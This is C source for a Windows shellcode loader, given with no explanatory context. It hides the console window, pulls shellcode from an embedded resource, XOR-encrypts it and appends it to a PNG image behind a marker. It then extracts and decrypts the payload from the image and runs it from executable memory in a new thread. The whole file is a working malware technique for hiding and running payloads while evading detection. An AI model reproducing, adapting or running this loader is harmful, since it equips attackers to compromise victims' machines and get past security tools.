#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>


#define PNG_FILE      L"Thth.png"
#define MARKER        "[PNGDATA]:"
#define XOR_KEY       "6BhIg8YYiEb7x0b8AAAAAPZDSAIPhNEAAABEi8ZFK8RB"
#define RES_ID        1001


void XorCrypt(BYTE* data, DWORD dataLen, const char* key, DWORD keyLen)
{
    for (DWORD i = 0; i < dataLen; i++)
    {
        data[i] ^= key[i % keyLen];
    }
}


BOOL GetShellcodeFromResource(BYTE** ppData, DWORD* pDataLen)
{
    HRSRC hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(RES_ID), RT_RCDATA);
    if (!hRsrc)
        return FALSE;

    HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
    if (!hGlobal)
        return FALSE;

    *pDataLen = SizeofResource(NULL, hRsrc);
    *ppData = (BYTE*)LockResource(hGlobal);

    return (*ppData != NULL && *pDataLen > 0);
}


BOOL EmbedPayload()
{
    BYTE* pShellRaw = NULL;
    DWORD shellLen = 0;
    if (!GetShellcodeFromResource(&pShellRaw, &shellLen))
    {
        return FALSE;
    }

    BYTE* pShellBuf = (BYTE*)malloc(shellLen);
    if (!pShellBuf) return FALSE;
    memcpy(pShellBuf, pShellRaw, shellLen);

    DWORD keyLen = strlen(XOR_KEY);
    XorCrypt(pShellBuf, shellLen, XOR_KEY, keyLen);

    HANDLE hFile = CreateFileW(PNG_FILE, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        free(pShellBuf);
        return FALSE;
    }

    DWORD pngSize = GetFileSize(hFile, NULL);
    BYTE* pngData = (BYTE*)malloc(pngSize);
    DWORD read;
    ReadFile(hFile, pngData, pngSize, &read, NULL);
    CloseHandle(hFile);

    hFile = CreateFileW(PNG_FILE, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    WriteFile(hFile, pngData, pngSize, &read, NULL);
    WriteFile(hFile, MARKER, strlen(MARKER), &read, NULL);
    WriteFile(hFile, pShellBuf, shellLen, &read, NULL);

    CloseHandle(hFile);
    free(pngData);
    free(pShellBuf);

    return TRUE;
}


BOOL ExecuteFromPNG()
{
    HANDLE hFile = CreateFileW(PNG_FILE, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* fileData = (BYTE*)malloc(fileSize);
    DWORD read;
    ReadFile(hFile, fileData, fileSize, &read, NULL);
    CloseHandle(hFile);

    DWORD markerLen = strlen(MARKER);
    BYTE* pPayload = NULL;
    for (DWORD i = 0; i < fileSize - markerLen; i++)
    {
        if (memcmp(fileData + i, MARKER, markerLen) == 0)
        {
            pPayload = fileData + i + markerLen;
            break;
        }
    }

    if (!pPayload)
    {
        free(fileData);
        return FALSE;
    }

    DWORD payloadLen = fileSize - (pPayload - fileData);
    DWORD keyLen = strlen(XOR_KEY);
    XorCrypt(pPayload, payloadLen, XOR_KEY, keyLen);

    LPVOID pExecMem = VirtualAlloc(NULL, payloadLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pExecMem)
    {
        free(fileData);
        return FALSE;
    }

    memcpy(pExecMem, pPayload, payloadLen);

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pExecMem, NULL, 0, NULL);
    if (hThread)
    {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }

    VirtualFree(pExecMem, 0, MEM_RELEASE);
    free(fileData);
    return TRUE;
}


int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR cmd, int nShow)
{

    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    EmbedPayload();
    ExecuteFromPNG();

    return 0;
}